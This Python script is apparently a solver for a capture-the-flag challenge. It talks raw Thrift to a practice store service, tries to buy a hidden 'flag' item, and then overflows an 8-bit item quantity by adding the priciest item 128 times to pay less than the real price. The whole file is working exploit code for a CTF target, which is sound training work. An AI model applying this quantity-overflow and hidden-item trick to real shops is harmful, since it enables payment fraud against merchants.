#!/usr/bin/env python3
import socket
import struct
import sys
import time

# Thrift TType constants
T_STOP   = 0x00
T_VOID   = 0x01
T_BOOL   = 0x02
T_BYTE   = 0x03  # i8
T_DOUBLE = 0x04
T_I16    = 0x06
T_I32    = 0x08
T_U64    = 0x0b  # historical, not used here
T_STRING = 0x0b  # string/binary
T_STRUCT = 0x0c
T_MAP    = 0x0d
T_SET    = 0x0e
T_LIST   = 0x0f
T_I64    = 0x0a

MSG_TYPE_CALL      = 1
MSG_TYPE_REPLY     = 2
MSG_TYPE_EXCEPTION = 3
MSG_TYPE_ONEWAY    = 4

VERSION_1 = 0x80010000


class Buf:
    def __init__(self):
        self.b = bytearray()
    def write(self, data: bytes):
        self.b.extend(data)
    def get(self) -> bytes:
        return bytes(self.b)


def w_i8(v):
    return struct.pack('>b', v)
def w_i16(v):
    return struct.pack('>h', v)
def w_i32(v):
    # pack signed 32-bit (two's complement)
    if v >= 2**31:
        v -= 2**32
    elif v < -2**31:
        v += 2**32
    return struct.pack('>i', v)
def w_i64(v):
    return struct.pack('>q', v)
def w_str(s: str):
    bs = s.encode('utf-8')
    return w_i32(len(bs)) + bs


class Reader:
    def __init__(self, s: socket.socket):
        self.s = s
        self.buf = b''
    def _recv_exact(self, n):
        out = bytearray()
        while len(out) < n:
            chunk = self.s.recv(n - len(out))
            if not chunk:
                raise EOFError('socket closed')
            out.extend(chunk)
        return bytes(out)
    def read(self, n):
        if len(self.buf) < n:
            self.buf += self._recv_exact(n - len(self.buf))
        out, self.buf = self.buf[:n], self.buf[n:]
        return out
    def r_i8(self):
        return struct.unpack('>b', self.read(1))[0]
    def r_u8(self):
        return self.read(1)[0]
    def r_i16(self):
        return struct.unpack('>h', self.read(2))[0]
    def r_i32(self):
        return struct.unpack('>i', self.read(4))[0]
    def r_i64(self):
        return struct.unpack('>q', self.read(8))[0]
    def r_str(self):
        L = self.r_i32()
        return self.read(L).decode('utf-8', errors='replace')


class BytesReader:
    def __init__(self, data: bytes):
        self.buf = memoryview(data)
        self.pos = 0
    def read(self, n):
        if self.pos + n > len(self.buf):
            raise EOFError('short frame')
        out = self.buf[self.pos:self.pos+n].tobytes()
        self.pos += n
        return out
    def r_u8(self):
        b = self.read(1)
        return b[0]
    def r_i8(self):
        return struct.unpack('>b', self.read(1))[0]
    def r_i16(self):
        return struct.unpack('>h', self.read(2))[0]
    def r_i32(self):
        return struct.unpack('>i', self.read(4))[0]
    def r_i64(self):
        return struct.unpack('>q', self.read(8))[0]
    def r_str(self):
        L = self.r_i32()
        return self.read(L).decode('utf-8', errors='replace')


def write_message(method: str, msg_type: int, seqid: int, body_bytes: bytes) -> bytes:
    buf = Buf()
    buf.write(w_i32(VERSION_1 | msg_type))
    buf.write(w_str(method))
    buf.write(w_i32(seqid))
    buf.write(body_bytes)
    return buf.get()


def write_field_string(fid: int, val: str) -> bytes:
    return bytes([T_STRING]) + w_i16(fid) + w_str(val)


def write_field_i64(fid: int, val: int) -> bytes:
    return bytes([T_I64]) + w_i16(fid) + w_i64(val)


def write_stop() -> bytes:
    return bytes([T_STOP])


def read_message_begin(r: Reader):
    ver = r.r_i32()
    if (ver & 0xffff0000) != VERSION_1:
        raise ValueError('Non-strict binary not supported')
    msg_type = ver & 0x000000ff
    name = r.r_str()
    seqid = r.r_i32()
    return name, msg_type, seqid


def skip_type(r: Reader, ttype: int):
    if ttype == T_STOP:
        return
    elif ttype == T_BOOL or ttype == T_BYTE:
        r.read(1)
    elif ttype == T_I16:
        r.read(2)
    elif ttype == T_I32:
        r.read(4)
    elif ttype == T_I64 or ttype == T_DOUBLE:
        r.read(8)
    elif ttype == T_STRING:
        L = r.r_i32()
        r.read(L)
    elif ttype == T_STRUCT:
        while True:
            t = r.r_u8()
            if t == T_STOP:
                break
            r.read(2)  # field id
            skip_type(r, t)
    elif ttype == T_MAP:
        kt = r.r_u8(); vt = r.r_u8(); size = r.r_i32()
        for _ in range(size):
            skip_type(r, kt)
            skip_type(r, vt)
    elif ttype == T_LIST or ttype == T_SET:
        et = r.r_u8(); size = r.r_i32()
        for _ in range(size):
            skip_type(r, et)
    else:
        raise ValueError(f'Unknown TType {ttype}')


def parse_createBasket_reply(r: Reader):
    # Data: struct { 1: string id }
    t = r.r_u8()
    if t != T_STRUCT:
        raise ValueError('expected struct container')
    fid = r.r_i16()
    # Inside struct: field 1 string id
    t = r.r_u8()
    if t != T_STRING:
        raise ValueError('expected string field')
    fid = r.r_i16()
    if fid != 1:
        raise ValueError('expected field id 1')
    bid = r.r_str()
    # stop inner struct
    t = r.r_u8()
    if t != T_STOP:
        raise ValueError('expected inner stop')
    # outer stop
    t = r.r_u8()
    if t != T_STOP:
        raise ValueError('expected outer stop')
    return bid


def parse_getInventory_prices(r: Reader):
    prices = {}
    # Data: struct { 1: list<struct> }
    if r.r_u8() != T_STRUCT:
        raise ValueError('exp struct')
    fid = r.r_i16()
    # field 1 list
    if r.r_u8() != T_LIST:
        raise ValueError('exp list')
    fid = r.r_i16()
    et = r.r_u8(); size = r.r_i32()
    if et != T_STRUCT:
        raise ValueError('exp list<struct>')
    for _ in range(size):
        # struct Item {1:id(string),2:name(string),3:price(i64),4:desc(string opt)}
        while True:
            t = r.r_u8()
            if t == T_STOP:
                break
            fid = r.r_i16()
            if t == T_STRING and fid == 1:
                item_id = r.r_str()
                # read until we see price field (3)
                # peek next fields but we cannot easily backtrack; store then continue parsing
                # We'll stash in temporary dict and finalise when we see price
                # Simpler: keep last seen id in variable
                last_id = item_id
            elif t == T_I64 and fid == 3:
                price = r.r_i64()
                # last_id must have been seen earlier in this struct
                try:
                    prices[last_id] = price
                except NameError:
                    pass
            else:
                # skip any other field
                skip_type(r, t)
        # end of item struct
    # after list, there is no more
    t = r.r_u8();  # outer stop
    if t != T_STOP:
        raise ValueError('expected outer stop at end of getInventory')
    return prices


def parse_getBasket(r: Reader):
    lines = []  # list of (id, qty)
    if r.r_u8() != T_STRUCT:
        raise ValueError('exp struct')
    fid = r.r_i16()
    if r.r_u8() != T_LIST:
        raise ValueError('exp list')
    fid = r.r_i16()
    et = r.r_u8(); n = r.r_i32()
    if et != T_STRUCT:
        raise ValueError('exp list<struct>')
    for _ in range(n):
        item_id = None; qty = None
        while True:
            t = r.r_u8()
            if t == T_STOP:
                break
            fid = r.r_i16()
            if t == T_STRING and fid == 1:
                item_id = r.r_str()
            elif t == T_BYTE and fid == 2:
                qty = r.r_i8()
            else:
                skip_type(r, t)
        if item_id is not None and qty is not None:
            lines.append((item_id, qty))
    t = r.r_u8()
    if t != T_STOP:
        raise ValueError('exp outer stop')
    return lines


def parse_exception(r: Reader):
    # TApplicationException: struct {1:string message, 2:i32 type}
    if r.r_u8() != T_STRUCT:
        return '(no struct)'
    msg = None; typ = None
    while True:
        t = r.r_u8()
        if t == T_STOP:
            break
        fid = r.r_i16()
        if t == T_STRING and fid == 1:
            msg = r.r_str()
        elif t == T_I32 and fid == 2:
            typ = r.r_i32()
        else:
            skip_type(r, t)
    return f'Exception(type={typ}, message={msg})'


def collect_strings(r) -> list[str]:
    strings = []
    # Data often begins with a struct wrapper; handle generically
    def read_any(tt):
        nonlocal strings
        if tt == T_STRING:
            L = r.r_i32(); s = r.read(L).decode('utf-8', errors='replace')
            strings.append(s)
        elif tt == T_STRUCT:
            while True:
                t = r.r_u8()
                if t == T_STOP:
                    break
                r.read(2)  # fid
                read_any(t)
        elif tt == T_LIST or tt == T_SET:
            et = r.r_u8(); n = r.r_i32()
            for _ in range(n):
                read_any(et)
        elif tt == T_MAP:
            kt = r.r_u8(); vt = r.r_u8(); n = r.r_i32()
            for _ in range(n):
                read_any(kt); read_any(vt)
        elif tt in (T_BOOL, T_BYTE):
            r.read(1)
        elif tt == T_I16:
            r.read(2)
        elif tt == T_I32:
            r.read(4)
        elif tt in (T_I64, T_DOUBLE):
            r.read(8)
        elif tt == T_STOP:
            return
        else:
            # unknown -> skip via generic
            skip_type(r, tt)
    # Try to read zero or more top-level fields until stop
    try:
        while True:
            t = r.r_u8()
            if t == T_STOP:
                break
            # expect field id
            r.read(2)
            read_any(t)
    except EOFError:
        pass
    return strings


class ThriftClient:
    def __init__(self, host, port, timeout=5.0):
        self.host = host; self.port = port
        self.s = socket.create_connection((host, port), timeout=timeout)
        self.s.settimeout(timeout)
        self.r = Reader(self.s)
        self.seqid = 0
    def _read_frame(self) -> BytesReader:
        # framed transport: 4-byte BE length
        header = self.r.read(4)
        if len(header) < 4:
            raise EOFError('no frame header')
        (size,) = struct.unpack('>i', header)
        if size < 0 or size > 10_000_000:
            raise ValueError(f'bad frame size {size}')
        payload = self.r.read(size)
        return BytesReader(payload)
    def call(self, method: str, body: bytes):
        msg = write_message(method, MSG_TYPE_CALL, self.seqid, body)
        frame = w_i32(len(msg)) + msg
        self.s.sendall(frame)
        fr = self._read_frame()
        name, mtype, seq = read_message_begin(fr)
        if mtype == MSG_TYPE_EXCEPTION:
            info = parse_exception(fr)
            raise RuntimeError(f'{method} -> {info}')
        if mtype != MSG_TYPE_REPLY:
            raise RuntimeError(f'Unexpected message type {mtype}')
        return name, fr
    def getInventory(self):
        body = write_stop()
        _, fr = self.call('getInventory', body)
        prices = parse_getInventory_prices(fr)
        return prices
    def createBasket(self):
        body = write_stop()
        _, fr = self.call('createBasket', body)
        bid = parse_createBasket_reply(fr)
        return bid
    def addToBasket(self, basket_id: str, item_id: str):
        body = write_field_string(1, basket_id) + write_field_string(2, item_id) + write_stop()
        _, fr = self.call('addToBasket', body)
        # addToBasket reply appears to be void
        # In practice it's empty Data (stop/stop). Skip if present.
        # Some servers send no struct; be robust.
        try:
            t = fr.r_u8()
            if t != T_STOP:
                # likely struct wrapper; skip it entirely
                skip_type(fr, t)
                t2 = fr.r_u8()
                if t2 != T_STOP:
                    pass
        except Exception:
            pass
    def getBasket(self, basket_id: str):
        body = write_field_string(1, basket_id) + write_stop()
        _, fr = self.call('getBasket', body)
        return parse_getBasket(fr)
    def pay(self, basket_id: str, total: int):
        body = write_field_string(1, basket_id) + write_field_i64(2, total) + write_stop()
        _, fr = self.call('pay', body)
        # Try to collect any strings from the reply (flag?)
        ss = collect_strings(fr)
        return ss


def solve(host: str, port: int):
    print(f'[+] Connecting to {host}:{port}')
    cli = ThriftClient(host, port, timeout=5.0)
    prices = cli.getInventory()
    print(f'[+] Inventory items: {len(prices)}')
    # pick the most expensive
    expensive = max(prices.items(), key=lambda kv: kv[1])[0]
    print(f'[+] Most expensive: {expensive} = {prices[expensive]}')

    bid = cli.createBasket()
    print(f'[+] Basket id: {bid}')

    # Try hidden item 'flag' first
    try:
        print('[*] Trying to add hidden item id "flag"...')
        cli.addToBasket(bid, 'flag')
        lines = cli.getBasket(bid)
        print(f'    Basket lines: {lines}')
        # compute total with known prices; unknown items treated as 0
        total = 0
        for iid, qty in lines:
            price = prices.get(iid, 0)
            total += price * qty
        print(f'    Attempt pay total={total}')
        ss = cli.pay(bid, total)
        print('[+] pay(flag) success!')
        if ss:
            print('\n'.join(s for s in ss if s))
        return
    except Exception as e:
        print(f'[-] flag item path failed: {e}')

    # Overflow quantity with expensive item
    print('[*] Overflowing quantity with expensive item...')
    for _ in range(128):
        cli.addToBasket(bid, expensive)
    lines = cli.getBasket(bid)
    print(f'[+] Basket lines: {lines}')
    total = 0
    for iid, qty in lines:
        price = prices.get(iid, 0)
        total += price * qty
    print(f'[+] Computed total={total}')
    try:
        ss = cli.pay(bid, total)
        print('[+] pay success!')
        if ss:
            print('\n'.join(s for s in ss if s))
    except Exception as e:
        print(f'[-] pay failed: {e}')


if __name__ == '__main__':
    host = 'thrift-store.chal.imaginaryctf.org'
    port = 9090
    if len(sys.argv) >= 2:
        host = sys.argv[1]
    if len(sys.argv) >= 3:
        port = int(sys.argv[2])
    solve(host, port)
